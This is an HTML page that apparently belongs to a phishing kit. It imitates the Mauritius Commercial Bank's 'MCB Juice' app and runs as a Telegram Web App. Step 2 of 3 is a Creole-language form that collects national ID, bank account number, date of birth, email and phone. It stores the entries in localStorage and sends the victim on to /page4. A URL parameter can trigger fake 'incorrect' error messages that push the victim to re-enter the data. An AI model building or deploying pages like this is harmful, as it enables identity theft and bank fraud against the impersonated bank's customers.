<!DOCTYPE html>
<html lang="mfe">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MCB Juice - Informasion Personele</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --mcb-red: #d32f2f;
            --mcb-hover: #b71c1c;
            --bg-color: #fce4ec;
            --card-bg: #ffffff;
            --text-main: #000000;
            --text-muted: #888888;
            --input-border: #e2e8f0;
            --btn-gray: #e8e8e8;
            --btn-gray-text: #555555;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .app-header {
            width: 100%;
            background-color: var(--mcb-red);
            height: 60px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-btn-top {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            font-size: 20px;
            font-weight: 800;
            color: #ffffff;
        }

        .header-title .mcb-bold { color: #ffffff; margin-right: 4px; }
        .header-title .mcb-sub { color: #ffccbc; font-weight: 500; }

        .card {
            background: white;
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 20px;
        }

        .step-indicator {
            display: flex;
            justify-content: space-center;
            gap: 12px;
            margin: 0 auto 32px;
            width: 80%;
        }

        .step-bar {
            flex: 1;
            height: 4px;
            background-color: #e2e8f0;
            border-radius: 2px;
        }

        .step-bar.active {
            background-color: var(--mcb-red);
        }

        .form-group {
            margin-bottom: 22px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 15px;
            font-weight: 700;
            color: #222222;
            margin-bottom: 10px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #333333;
            outline: none;
            width: 100%;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }

        .form-control:focus {
            border-color: var(--mcb-red);
        }

        .phone-group {
            display: flex;
            gap: 10px;
        }

        .country-prefix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background-color: #f5f5f5;
            border: 1px solid var(--input-border);
            border-radius: 10px;
            padding: 0 14px;
            font-weight: 700;
            font-size: 15px;
            color: #111111;
            white-space: nowrap;
        }

        .flag-icon {
            font-size: 18px;
            line-height: 1;
        }

        .phone-hint {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
        }

        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 20px;
            width: 100%;
            display: none;
            text-align: center;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-next {
            background-color: var(--mcb-red);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: var(--mcb-hover);
        }

        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #666666;
            margin-top: auto;
        }
    </style>
</head>

<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title">
        <span class="mcb-bold">MCB</span><span class="mcb-sub">JUICE</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Informasion Personele</h1>
    <div class="subtext">etap 2 lor 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <div id="errorDisplay" class="error-banner"></div>

    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="nationalId">Kart Idantite Nasional (National ID)</label>
            <input type="text" id="nationalId" class="form-control" placeholder="Egil: B1234567890123" required>
        </div>

        <div class="form-group">
            <label for="accountNumber">Nimero Kont MCB (Account Number)</label>
            <input type="text" id="accountNumber" class="form-control" placeholder="Egil: 000123456789" required>
        </div>

        <div class="form-group">
            <label for="dob">Dat Nescens (Date of Birth)</label>
            <input type="date" id="dob" class="form-control" required>
        </div>

        <div class="form-group">
            <label for="email">Adrès Imel (Email)</label>
            <input type="email" id="email" class="form-control" placeholder="nom@exemple.mu" required>
        </div>

        <div class="form-group">
            <label for="phone">No. Telefonn (Mobile Number)</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span class="flag-icon">🇲🇺</span>
                    <span>+230</span>
                </div>
                <input type="tel" id="phone" class="form-control" placeholder="58123456" maxlength="8" required>
            </div>
            <div class="phone-hint">8 chif (egil: 58123456)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()"> Tounen</button>
            <button type="submit" class="btn-next">ETAP SWIVAN</button>
        </div>
    </form>
</div>

<div class="footer-banner">
    © 2026 MCB Mauritius
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        if (localStorage.getItem('nationalId')) document.getElementById('nationalId').value = localStorage.getItem('nationalId');
        if (localStorage.getItem('accountNumber')) document.getElementById('accountNumber').value = localStorage.getItem('accountNumber');
        if (localStorage.getItem('dob')) document.getElementById('dob').value = localStorage.getItem('dob');
        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');

        const urlParams = new URLSearchParams(window.location.search);
        const errType = urlParams.get('error');
        const errorDisplay = document.getElementById('errorDisplay');

        if (errType === 'nationalid') {
            errorDisplay.innerText = "❌ National ID not korek, silvouplé verifye.";
            errorDisplay.style.display = "block";
        } else if (errType === 'account') {
            errorDisplay.innerText = "❌ Nimero Kont MCB pa korek.";
            errorDisplay.style.display = "block";
        } else if (errType === 'dob') {
            errorDisplay.innerText = "❌ Dat nescens pa korek.";
            errorDisplay.style.display = "block";
        }
    };

    function goNext(event) {
        event.preventDefault();

        const nationalId = document.getElementById('nationalId').value.trim();
        const accountNumber = document.getElementById('accountNumber').value.trim();
        const dob = document.getElementById('dob').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!nationalId || !accountNumber || !dob || !email || !phone) {
            alert("Silvouplé ranpli tou bann lorganizasion.");
            return;
        }

        localStorage.setItem('nationalId', nationalId);
        localStorage.setItem('accountNumber', accountNumber);
        localStorage.setItem('dob', dob);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>

</body>
</html>
